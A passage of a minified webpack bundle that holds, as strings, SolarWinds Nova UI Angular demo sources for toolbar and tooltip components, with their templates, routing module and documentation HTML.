{\n        this.showFirst = !this.showFirst;\n    }\n}\n'},4360:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Basic toolbar usage</h3>\n    <nui-toolbar id="nui-toolbar-test">\n        <nui-toolbar-group title="g1">\n            <nui-toolbar-item\n                id="nui-toolbar-test-button-primary"\n                displayStyle="main"\n                type="primary"\n                icon="edit"\n                title="Edit"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="filter" title="Filter">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="lock" title="Lock">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="browse" title="Browse">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="clear" title="Clear">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="download" title="Download">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group title="g2">\n            <nui-toolbar-item type="primary" icon="copy" title="Copy">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="enable" title="Enable">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="execute" title="Execute">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="hide" title="Hide">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="ignore" title="Ignore">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                displayStyle="destructive"\n                type="secondary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n    </nui-toolbar>\n</div>\n\n<div class="container">\n    <h3>Toolbar with embedded content</h3>\n    <nui-toolbar id="nui-toolbar-test-embedded">\n        <nui-toolbar-group title="g1">\n            <nui-toolbar-item\n                id="nui-toolbar-embedded-test-button-primary"\n                displayStyle="main"\n                type="primary"\n                icon="edit"\n                title="Edit"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="filter" title="Filter">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="lock" title="Lock">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="browse" title="Browse">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                id="nui-toolbar-embedded-test-button"\n                type="primary"\n                icon="clear"\n                title="Clear"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="download" title="Download">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group title="g2">\n            <nui-toolbar-item type="primary" icon="copy" title="Copy">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="enable" title="Enable">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="execute" title="Execute">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="hide" title="Hide">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="ignore" title="Ignore">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                id="nui-toolbar-embedded-test-destructive-button"\n                displayStyle="destructive"\n                type="secondary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <div class="nui-toolbar-embedded">\n            <nui-search\n                class="mr-1"\n                id="nui-toolbar-embedded-test-search"\n                (search)="search()"\n            ></nui-search>\n            <nui-menu\n                id="nui-toolbar-embedded-test-menu"\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                [icon]="\'menu\'"\n            ></nui-menu>\n        </div>\n    </nui-toolbar>\n</div>\n\n<div class="container">\n    <h3>Toolbar with selected section</h3>\n    <nui-toolbar\n        id="nui-toolbar-test-selected"\n        [selectionEnabled]="true"\n        [selectedItems]="select"\n    >\n        <nui-toolbar-group title="g1">\n            <nui-toolbar-item\n                id="nui-toolbar-selected-test-button-primary"\n                displayStyle="main"\n                type="primary"\n                icon="edit"\n                title="Edit"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="filter" title="Filter">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="lock" title="Lock">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="browse" title="Browse">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                id="nui-toolbar-selected-test-button"\n                type="primary"\n                icon="clear"\n                title="Clear"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="download" title="Download">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group title="g2">\n            <nui-toolbar-item type="primary" icon="copy" title="Copy">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="enable" title="Enable">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="execute" title="Execute">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="hide" title="Hide">\n            </nui-toolbar-item>\n            <nui-toolbar-item type="secondary" icon="ignore" title="Ignore">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                id="nui-toolbar-selected-test-destructive-button"\n                displayStyle="destructive"\n                type="secondary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <div class="nui-toolbar-embedded">\n            <nui-search\n                class="mr-1"\n                id="nui-toolbar-selected-test-search"\n                (search)="search()"\n            ></nui-search>\n            <nui-menu\n                id="nui-toolbar-selected-test-menu"\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                [icon]="\'menu\'"\n            ></nui-menu>\n        </div>\n    </nui-toolbar>\n</div>\n<div class="container">\n    <h3>Toolbar with no menu</h3>\n    <nui-toolbar id="nui-toolbar-no-menu-with-search">\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="main"\n                type="primary"\n                icon="add"\n                title="Add"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="edit" title="Edit">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="destructive"\n                type="primary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <div class="nui-toolbar-embedded">\n            <nui-search [value]="value" [placeholder]="placeholder">\n            </nui-search>\n        </div>\n    </nui-toolbar>\n</div>\n\n<div class="container">\n    <h3>Toolbar with selection and no menu</h3>\n    <nui-toolbar\n        id="nui-toolbar-with-selection-no-menu-with-search"\n        [selectionEnabled]="true"\n        [selectedItems]="select"\n        #toolbar\n    >\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="deselect" title="Deselect">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="deselect-all"\n                title="Deselect All"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="destructive"\n                type="primary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <div class="nui-toolbar-embedded">\n            <nui-search [value]="value" [placeholder]="placeholder">\n            </nui-search>\n        </div>\n    </nui-toolbar>\n</div>\n\n<div class="container">\n    <h3>Toolbar with no menu</h3>\n    <nui-toolbar id="nui-toolbar-no-menu">\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="main"\n                type="primary"\n                icon="add"\n                title="Add"\n            >\n            </nui-toolbar-item>\n            <nui-toolbar-item type="primary" icon="edit" title="Edit">\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="destructive"\n                type="primary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n    </nui-toolbar>\n</div>\n\n<div class="container">\n    <h3>Toolbar with selection and no menu</h3>\n    <nui-toolbar\n        id="nui-toolbar-with-selection-no-menu"\n        [selectionEnabled]="true"\n        #toolbar\n    >\n        <nui-toolbar-group>\n            <nui-toolbar-item type="primary" icon="deselect" title="Deselect">\n            </nui-toolbar-item>\n            <nui-toolbar-item\n                type="primary"\n                icon="deselect-all"\n                title="Deselect All"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n        <nui-toolbar-group>\n            <nui-toolbar-item\n                displayStyle="destructive"\n                type="primary"\n                icon="delete"\n                title="Delete"\n            >\n            </nui-toolbar-item>\n        </nui-toolbar-group>\n    </nui-toolbar>\n</div>\n'},92440:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-toolbar-visual-test",\n    templateUrl: "./toolbar-visual-test.component.html",\n})\nexport class ToolbarVisualTestExampleComponent {\n    public value = "";\n    public busy = false;\n    public placeholder = "Placeholder";\n\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "section title",\n            itemsSource: [\n                { title: "Menu Item", itemType: "action" },\n                { title: "Hover me", itemType: "action" },\n                { title: "Selected menu item", isSelected: true },\n                { title: "Menu item", itemType: "switch", checked: true },\n                {\n                    title: "Menu disabled item",\n                    itemType: "switch",\n                    checked: false,\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with checkbox",\n                    itemType: "option",\n                    disabled: true,\n                },\n                {\n                    title: "Menu item with icon",\n                    itemType: "action",\n                    icon: "table",\n                },\n                {\n                    title: "Link menu item",\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: "Export PDF",\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n    ];\n\n    public select = {\n        current: 1,\n        total: 72,\n    };\n\n    public search(): void {\n        this.busy = !this.busy;\n    }\n}\n'},80768:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiSearchModule,\n    NuiSwitchModule,\n    NuiTextboxModule,\n    NuiToolbarModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ToolbarBasicExampleComponent,\n    ToolbarDocsExampleComponent,\n    ToolbarEmbeddedContentExampleComponent,\n    ToolbarItemTypesExampleComponent,\n    ToolbarSelectionExampleComponent,\n    ToolbarTestExampleComponent,\n    ToolbarVisualTestExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ToolbarDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "toolbar-test",\n        component: ToolbarTestExampleComponent,\n    },\n    {\n        path: "toolbar-visual-test",\n        component: ToolbarVisualTestExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiToolbarModule,\n        NuiMenuModule,\n        NuiSearchModule,\n        NuiSwitchModule,\n        NuiTextboxModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ToolbarBasicExampleComponent,\n        ToolbarDocsExampleComponent,\n        ToolbarEmbeddedContentExampleComponent,\n        ToolbarSelectionExampleComponent,\n        ToolbarItemTypesExampleComponent,\n        ToolbarTestExampleComponent,\n        ToolbarVisualTestExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("toolbar"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ToolbarModule {}\n'},37814:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./tooltip-basic/tooltip-basic.example.component";\nexport * from "./tooltip-docs/tooltip-docs.example.component";\nexport * from "./tooltip-disabled/tooltip-disabled.example.component";\nexport * from "./tooltip-ellipsis/tooltip-ellipsis.example.component";\nexport * from "./tooltip-position/tooltip-position.example.component";\nexport * from "./tooltip-trigger/tooltip-trigger.example.component";\nexport * from "./tooltip-visual-test/tooltip-visual-test.component";\n'},21208:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<span [nuiTooltip]="tooltip" i18n>Hover over me!</span>\n'},65576:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tooltip-basic-example",\n    templateUrl: "tooltip-basic.example.component.html",\n})\nexport class TooltipBasicExampleComponent {\n    public tooltip = $localize`I am a Tooltip!`;\n\n    constructor() {}\n}\n'},52978:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-column">\n    <div class="d-flex flex-row mb-5">\n        <span [nuiTooltip]="tooltip" [nuiTooltipDisabled]="isDisabled" i18n>\n            Hover over me!\n        </span>\n    </div>\n    <div class="d-flex flex-row">\n        <nui-switch\n            [value]="isDisabled"\n            (valueChange)="onValueChanged($event)"\n            i18n\n        >\n            {{ message }}\n        </nui-switch>\n    </div>\n</div>\n'},10254:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tooltip-disabled-example",\n    templateUrl: "tooltip-disabled.example.component.html",\n})\nexport class TooltipDisabledExampleComponent {\n    public isDisabled = false;\n    public tooltip = $localize`I am a Tooltip!`;\n    public message = $localize`Toggle to switch state`;\n\n    constructor() {}\n\n    public onValueChanged(value: boolean): void {\n        this.isDisabled = value;\n        this.message = value\n            ? $localize`Tooltip is Disabled and hidden!`\n            : $localize`Tooltip is Enabled and can be shown"`;\n    }\n}\n'},12952:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiTooltipModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    <code>Tooltip</code> is a directive that creates a tooltip container, and\n    can be used with any element on the page. It is extremely easy to use,\n    simply add a tooltip directive attribute, and assign a desired value to\n    it.<br />\n    <nui-message type="info" [allowDismiss]="false">\n        <strong>Note:</strong> Toolitp\'s <em>MAX WIDTH</em> is\n        <strong>250px</strong>. The longer text will wrap to a new line if\n        exceeds\n    </nui-message>\n</p>\n\n<nui-example-wrapper filenamePrefix="tooltip-basic" exampleTitle="Basic Usage">\n    <nui-tooltip-basic-example></nui-tooltip-basic-example>\n</nui-example-wrapper>\n\n<h2>Disabled Tooltip</h2>\n<p>\n    <code>Tooltip</code> can be conditionally disabled, meaning it is possible\n    to quit showing it under certain conditions. Here is an example:\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tooltip-disabled"\n    exampleTitle="Disabled Tooltip Usage Example"\n>\n    <nui-tooltip-disabled-example></nui-tooltip-disabled-example>\n</nui-example-wrapper>\n\n<h2>Tooltip ellipsis</h2>\n<p>\n    <code>Tooltip</code> can be set to display itself on text overflow. This can\n    be used with nova class <code>nui-text-ellipsis</code> Here is an example:\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tooltip-ellipsis"\n    exampleTitle="Ellipsis Tooltip Usage Example"\n>\n    <nui-tooltip-ellipsis-example></nui-tooltip-ellipsis-example>\n</nui-example-wrapper>\n\n<h2>Tooltip Placement</h2>\n<p>\n    <code>Tooltip</code> can be positioned differently in relation to a host\n    component. By default, <code>nui-tooltip</code> position is\n    <code>top</code>, however, the tooltip can change its position if there is\n    not enough space to position itself in a chosen direction. The example below\n    shows how you can manually set the position of\n    <code>nui-tooltip</code> using the <code>tooltipPlacement</code> attribute.\n</p>\n<p>\n    Available placement options should be of a type\n    <code>TooltipPosition</code>: <code>top</code>, <code>bottom</code>,\n    <code>left</code>, <code>right</code>.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tooltip-position"\n    exampleTitle="Position Tooltip Usage Example"\n>\n    <nui-tooltip-position-example></nui-tooltip-position-example>\n</nui-example-wrapper>\n\n<h2>Tooltip Manual Trigger</h2>\n<p>\n    <code>Tooltip</code> can be triggered manually using it\'s public\n    <code>show()</code>, <code>hide()</code>, and <code>toggle()</code> methods.\n    Exmple below shows the example of typical usage of the feature.\n</p>\n<p>\n    Available placement options should be of a type\n    <code>TooltipPosition</code>: <code>top</code>, <code>bottom</code>,\n    <code>left</code>, <code>right</code>.<br />\n    <mark\n        >Thanks to the cdk overlay scrolling strategy, a tooltip will disappear\n        on scrolling only if it\'s gone off the viewport of the screen.</mark\n    >\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="tooltip-trigger"\n    exampleTitle="Manual Tooltip Trigger Usage Example"\n>\n    <nui-tooltip-trigger-example></nui-tooltip-trigger-example>\n</nui-example-wrapper>\n'},20584:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tooltip-docs-example",\n    templateUrl: "./tooltip-docs.example.component.html",\n})\nexport class TooltipDocsExampleComponent {}\n'},33112:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-column">\n    <div class="d-flex flex-row mb-5">\n        <span\n            [nuiTooltip]="shortContent"\n            [nuiTooltipEllipsis]="isEllipsisActive"\n            i18n\n            class="nui-text-ellipsis"\n            style="width: 200px"\n        >\n            {{ shortContent }}\n        </span>\n\n        <span\n            [nuiTooltip]="longContent"\n            [nuiTooltipEllipsis]="isEllipsisActive"\n            i18n\n            class="nui-text-ellipsis"\n            style="width: 200px"\n        >\n            {{ longContent }}\n        </span>\n    </div>\n    <div class="d-flex flex-row">\n        <nui-switch\n            [value]="isEllipsisActive"\n            (valueChange)="onValueChanged($event)"\n            i18n\n        >\n            {{ message }}\n        </nui-switch>\n    </div>\n</div>\n'},93480:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-tooltip-ellipsis-example",\n    templateUrl: "tooltip-ellipsis.example.component.html",\n})\nexport class TooltipEllipsisExampleComponent {\n    public isEllipsisActive = true;\n\n    public shortContent = $localize`I am a short message!`;\n    public longContent = $localize`I am a super long a message which does not fit inside its container!`;\n    public message = $localize`Toggle to switch state`;\n\n    constructor() {}\n\n    public onValueChanged(value: boolean): void {\n        this.isEllipsisActive = value;\n        this.message = value\n            ? $localize`Tooltip overflow detection is active!`\n            : $localize`Tooltip overflow detection is disabled`;\n    }\n}\n'},16704:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex flex-row justify-content-start">\n    <div class="d-flex flex-column mr-5">\n        <h4 i18n>Selected position:</h4>\n        <nui-radio-group name="positions" [(value)]="selectedPosition">\n            <nui-radio\n                *ngFor="let position of positions"\n                [value]="position"\n                [checked]="position === \'top\'"\n                i18n\n            >\n                {{ position }}\n            </nui-radio>\n        </nui-radio-group>\n    </div>\n    <div class="d-flex ml-5">\n        <div\n            class="d-flex flex-column justify-content-center align-items-center container"\n        >\n            <div class="with-border">\n                <span\n                    nuiTooltip="I\'m the Tooltip!"\n                    [tooltipPlacement]="selectedPosition"\n                    i18n\n                    >Hover Over Me!</span\n                >\n            </div>\n        </div>\n    </div>\n</div>\n'},15416:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "mixins";\n\n.container {\n    width: 300px;\n    border: 1px dashed;\n    .setCssVariable(border-color, nui-color-line-default);\n    padding: 0;\n}\n\n.with-border {\n    border: 1px red dashed;\n    padding: 5px;\n}\n'},8736:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { TooltipPosition } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-tooltip-position-example",\n    templateUrl: "tooltip-position.example.component.html",\n    styleUrls: ["./tooltip-position.example.component.less"],\n})\nexport class TooltipPositionExampleComponent {\n    public positions: TooltipPosition[] = ["top", "bottom", "left", "right"];\n    public selectedPosition: string;\n}\n'},3888:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="d-flex justify-content-start align-items-center w-25">\n    <button\n        nui-button\n        class="mr-auto"\n        #tooltip="nuiTooltip"\n        type="button"\n        [nuiTooltip]="tooltipText"\n        